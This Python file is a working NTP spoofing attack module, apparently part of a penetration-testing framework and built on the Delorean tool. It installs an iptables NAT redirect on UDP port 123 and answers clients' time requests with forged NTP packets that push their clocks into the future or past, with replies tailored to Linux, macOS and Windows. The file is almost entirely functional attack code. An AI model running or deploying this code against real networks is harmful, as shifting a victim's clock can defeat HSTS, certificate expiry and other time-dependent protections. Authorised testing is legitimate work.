'''
ntp_spoof.py use the software ntpserver
(and this implementation: https://github.com/PentesterES/Delorean)
	MIT license 
	https://github.com/limifly/ntpserver/blob/master/LICENSE
	 The MIT License (MIT)

	Copyright (c) {{{2014}}} {{{ChenLi}}}

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

'''


from termcolor import colored, cprint
from module import Module

import os
#from delorean import * 
import socket
import time
import threading
import datetime
import struct
import math
import re
import random
import sys
from subprocess import Popen, PIPE
from printib import * 













class CustomModule(Module):
    def __init__(self):
        information = {"Name": "NTP Spoofing - Delorean Server",
                       "Description": "NTP Spoofing module attack with Delorean by Jose Selvi",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"interface": ["0.0.0.0", "Interface for resolving NTP requests", True],
                   "port": ["123", "Port NTP Server", True],
                   "random": ["False", "Force random values. If random attribute is True, dates are random", True],
                   "skim_step": ["1M", "Skimming step: 10m (minutes), 3d (days), 10M (months)", True],
                   "banner": ["True", "Verbose", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        def go(options):


            def banner():
                print('                                    _._                                          ')
                print('                               _.-="_-         _                                 ')
                print('                          _.-="   _-          | ||"""""""---._______     __..    ')
                print('              ___.===""""-.______-,,,,,,,,,,,,`-\'\'----" """""       """""  __\'   ')
                print('       __.--""     __        ,\'                   o \           __        [__|   ')
                print('  __-""=======.--""  ""--.=================================.--""  ""--.=======:  ')
                print(' ]       [w] : /        \ : |========================|    : /        \ :  [w] :  ')
                print(' V___________:|          |: |========================|    :|          |:   _-"   ')
                print('  V__________: \        / :_|=======================/_____: \        / :__-"     ')
                print('  -----------\'  ""____""  `-------------------------------\'  ""____""            ')
                print('  ')
                print(' by jose selvi - https://github.com/PentesterES/Delorean ')




            class NTProxy(threading.Thread): #https://github.com/PentesterES/Delorean - jose selvi
                # Stop Flag
                stopF = False
                # Force Step or date
                skim_step = float(0)
                skim_threshold = float(0)
                forced_step = float(0)
                forced_date = float(0)
                forced_random = False
                # Temporal control
                seen = {}
                # Constructor
                def __init__(self, socket):
                    threading.Thread.__init__(self)
                    if socket:
                        self.step = 0
                        self.ntp_delta = (
                            (datetime.date(*time.gmtime(0)[0:3]) - datetime.date(1900, 1, 1)).days
                            * 24
                            * 3600
                        )
                        self.stopF = False
                        self.socket = socket
                        self.socket.settimeout(
                            5.0
                        )  # Needed: If not socket.recvfrom() waits forever

                # Force step or date
                def str2sec(self, mystr):
                    secs_in = {
                        "s": 1,
                        "m": 60,
                        "h": 3600,
                        "d": 86400,
                        "w": 604800,
                        "M": 2629743,
                        "y": 31556926,
                    }
                    if mystr[-1] in secs_in.keys():
                        num = int(mystr[:-1])
                        mag = secs_in[mystr[-1]]
                    else:
                        num = int(mystr)
                        mag = 1
                    return float(mag * num)

                def set_skim_threshold(self, threshold):
                    self.skim_threshold = self.str2sec(threshold)

                def set_skim_step(self, skim):
                    self.skim_step = self.str2sec(skim) - self.skim_threshold

                def force_step(self, step):
                    self.forced_step = self.str2sec(step)

                def force_date(self, date):
                    if len(date) == len("2014-01-01 05:32"):
                        pat = "%Y-%m-%d %H:%M"
                    else:
                        pat = "%Y-%m-%d %H:%M:%S"
                    self.forced_date = float(datetime.datetime.strptime(date, pat).strftime("%s"))

                def force_random(self, random):
                    self.forced_random = random

                # Set the step to the future/past
                def select_step(self):
                    # Get current date
                    current_time = time.time()
                    current_week_day = time.gmtime(current_time)[6]
                    current_month_day = time.gmtime(current_time)[2]
                    # Look for the same week and month day, minimum a thousand days in the future
                    if self.forced_step == 0 and not self.forced_random:
                        # Default Step
                        week_day = 10000
                        month_day = 10000
                        future_time = current_time + (3 * 12 * 4 * 7 * 24 * 3600)
                        while not (
                            (week_day == current_week_day) and (month_day == current_month_day)
                        ):
                            future_time = future_time + (7 * 24 * 3600)
                            week_day = time.gmtime(future_time)[6]
                            month_day = time.gmtime(future_time)[2]
                    elif self.forced_random:
                        min_time = math.floor(current_time)
                        max_time = 4294967294 - self.ntp_delta  # max 32 bits - 1
                        future_time = random.randint(min_time, max_time)
                    else:
                        # Forced Step
                        future_time = current_time + self.forced_step
                    self.step = future_time - current_time

                # Select a new time in the future/past
                def newtime(self, timestamp):
                    current_time = time.time()
                    skim_time = timestamp + self.skim_step - 5
                    future_time = current_time + self.step
                    if self.skim_step == 0:
                        skim_time = 4294967294
                    if self.forced_date == 0 and (skim_time > future_time):
                        return future_time
                    elif self.forced_date != 0 and (skim_time > self.forced_date):
                        return self.forced_date
                    else:
                        return skim_time

                # Stop Method
                def stop(self):
                    self.stopF = True

                # Run Method
                def run(self):
                    self.select_step()
                    while not self.stopF:
                        # When timeout we need to catch the exception
                        try:
                            data, source = self.socket.recvfrom(1024)
                            info = self.extract(data)
                            timestamp = self.newtime(info["tx_timestamp"] - self.ntp_delta)
                            fingerprint, data = self.response(info, timestamp)
                            if self.skim_step != 0:
                                for t in range(0, 10):
                                    fingerprint, data = self.response(info, timestamp)
                            socket.sendto(data, source)
                            # Only print if it's the first packet
                            epoch_now = time.time()
                            if (not source[0] in self.seen) or (
                                (source[0] in self.seen) and (epoch_now - self.seen[source[0]]) > 2
                            ):
                                if self.forced_random:
                                    self.select_step()
                                self.seen[source[0]] = epoch_now
                                # Year-Month-Day Hour:Mins
                                aux = time.gmtime(timestamp)
                                future_time = (
                                    str(aux[0]).zfill(4)
                                    + "-"
                                    + str(aux[1]).zfill(2)
                                    + "-"
                                    + str(aux[2]).zfill(2)
                                    + " "
                                    + str(aux[3]).zfill(2)
                                    + ":"
                                    + str(aux[4]).zfill(2)
                                )
                                aux = time.gmtime(time.time())
                                current_time = (
                                    str(aux[3]).zfill(2)
                                    + ":"
                                    + str(aux[4]).zfill(2)
                                    + ":"
                                    + str(aux[5]).zfill(2)
                                )
                                # print fingerprint + ' detected!'
                                if (timestamp - time.time()) < 0:
                                    when = "past"
                                else:
                                    when = "future"
                                print(
                                    "[%s] Sent to %s:%d - Going to the %s! %s"
                                    % (
                                        current_time,
                                        source[0],
                                        source[1],
                                        when,
                                        future_time,
                                    )
                                )
                        except:
                            continue

                # Extract query information
                def extract(self, data):
                    # Format from https://github.com/limifly/ntpserver/
                    unpacked = struct.unpack(
                        "!B B B b 11I", data[0 : struct.calcsize("!B B B b 11I")]
                    )
                    # Extract information
                    info = {}
                    info["leap"]                = unpacked[0] >> 6 & 0x3
                    info["version"]             = unpacked[0] >> 3 & 0x7
                    info["mode"]                = unpacked[0] & 0x7
                    info["stratum"]             = unpacked[1]
                    info["poll"]                = unpacked[2]
                    info["precision"]           = unpacked[3]
                    info["root_delay"]          = float(unpacked[4]) / 2 ** 16
                    info["root_dispersion"]     = float(unpacked[5]) / 2 ** 16
                    info["ref_id"]              = unpacked[6]
                    info["ref_timestamp"]       = unpacked[7] + float(unpacked[8]) / 2 ** 32
                    info["orig_timestamp"]      = unpacked[9] + float(unpacked[10]) / 2 ** 32
                    info["orig_timestamp_high"] = unpacked[9]
                    info["orig_timestamp_low"]  = unpacked[10]
                    info["recv_timestamp"]      = unpacked[11] + float(unpacked[12]) / 2 ** 32
                    info["tx_timestamp"]        = unpacked[13] + float(unpacked[14]) / 2 ** 32
                    info["tx_timestamp_high"]   = unpacked[13]
                    info["tx_timestamp_low"]    = unpacked[14]
                    # Return useful info for respose
                    return info

                # Create response packet
                def response(self, info, timestamp):
                    if (
                        info["leap"] == 0
                        and info["version"] == 4
                        and (info["mode"] == 3 or info["mode"] == 4)
                    ):
                        return self.response_osx(info, timestamp)
                    if (
                        (info["leap"] == 3 or info["leap"] == 192)
                        and info["version"] == 4
                        and info["mode"] == 3
                    ):
                        return self.response_linux(info, timestamp)
                    if info["version"] == 3:
                        return self.response_win(info, timestamp)
                    return self.response_default(info, timestamp)

                def generate_param(self, info, timestamp):
                    # Format from https://github.com/limifly/ntpserver/
                    # Define response params
                    ntp_timestamp = timestamp + self.ntp_delta
                    param = {}
                    param["ID"] = "Unknown"
                    param["leap"] = 0                   # No warnings, no errors
                    param["version"] = info["version"]  # Use the same request version
                    param["mode"] = 4                   # Always answer server mode
                    param["stratum"] = 2                # Highest NTP priority
                    param["poll"] = 9                   # As less poll time as possible
                    param["precision"] = -20            # Maximum precision
                    param["root_delay"] = 0
                    param["root_dispersion"] = 0
                    param["ref_id"] = info["ref_id"]
                    param["ref_timestamp"] = ntp_timestamp - 5
                    param["orig_timestamp"] = 0
                    param["orig_timestamp_high"] = info["tx_timestamp_high"]
                    param["orig_timestamp_low"] = info["tx_timestamp_low"]  # -1
                    param["recv_timestamp"] = ntp_timestamp
                    param["tx_timestamp"] = ntp_timestamp
                    param["tx_timestamp_high"] = 0
                    param["tx_timestamp_low"] = 0
                    return param

                def response_linux(self, info, timestamp):
                    param = self.generate_param(info, timestamp)
                    param["ID"] = "Linux"
                    # param['leap'] = 4
                    # param['version'] = info['version']
                    # param['mode'] = 4
                    # Construct packet
                    return param["ID"], self.packetize(info, param)

                def response_osx(self, info, timestamp):
                    param = self.generate_param(info, timestamp)
                    param["ID"] = "Mac OS X"
                    # param['ref_id'] = 0 # 17.72.133.55
                    # param['leap'] = 0
                    # param['version'] = 4
                    # param['mode'] = 4
                    # param['poll'] = 9
                    # Construct packet
                    return param["ID"], self.packetize(info, param)

                def response_win(self, info, timestamp):
                    param = self.generate_param(info, timestamp)
                    param["ID"] = "Windows"
                    # param['version'] = 3
                    # Construct packet
                    return param["ID"], self.packetize(info, param)

                def response_default(self, info, timestamp):
                    param = self.generate_param(info, timestamp)
                    # Construct packet
                    return param["ID"], self.packetize(info, param)

                def packetize(self, info, param):
                    # Format from https://github.com/limifly/ntpserver/
                    # print param['ID'] + ' detected!'
                    # Construct packet
                    packed = struct.pack(
                        "!B B B b 11I",
                        (param["leap"] << 6 | param["version"] << 3 | param["mode"]),
                        param["stratum"],
                        param["poll"],
                        param["precision"],
                        int(param["root_delay"]) << 16
                        | int(abs(param["root_delay"] - int(param["root_delay"])) * 2 ** 16),
                        int(param["root_dispersion"]) << 16
                        | int(
                            abs(param["root_dispersion"] - int(param["root_dispersion"])) * 2 ** 16
                        ),
                        param["ref_id"],
                        int(param["ref_timestamp"]),
                        int(abs(param["ref_timestamp"] - int(param["ref_timestamp"])) * 2 ** 32),
                        param["orig_timestamp_high"],
                        param["orig_timestamp_low"],
                        int(param["recv_timestamp"]),
                        int(abs(param["recv_timestamp"] - int(param["recv_timestamp"])) * 2 ** 32),
                        int(param["tx_timestamp"]),
                        int(abs(param["tx_timestamp"] - int(param["tx_timestamp"])) * 2 ** 32),
                    )
                    # Return packet
                    # int(abs(timestamp - int(timestamp)) * 2**32)
                    return packed










            import socket

            os.system("iptables -t nat -A PREROUTING -p udp --destination-port " + options["port"][0] + " -j REDIRECT --to-ports " + options["port"][0] )
            print_info("iptables rules enabled")  

            force_random = options["random"][0] in ["True","true"]
            banDel = options["banner"][0] in ["True","true"]

            socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socket.bind((options["interface"][0], int(options["port"][0])))
            NTP_Thread = NTProxy(socket)    
            NTP_Thread.force_random(force_random)
            if not force_random:
                NTP_Thread.set_skim_step(options["skim_step"][0])
            banDel = options["banner"][0] in ["True","true"]
            if banDel:
                banner()
            NTP_Thread.start()
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                time.sleep(1)

            os.system("iptables -t nat -D PREROUTING -p udp --destination-port " + options["port"][0]  + " -j REDIRECT --to-ports " + options["port"][0] )
            print_info("iptables rules disabled")
            NTP_Thread.stop()
            NTP_Thread.join()
            socket.close()
            print_ok("NTP Delorean Server closed")
                        

        #e = threading.Event()
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start()        
       
        super(CustomModule, self).run(t=thread1)
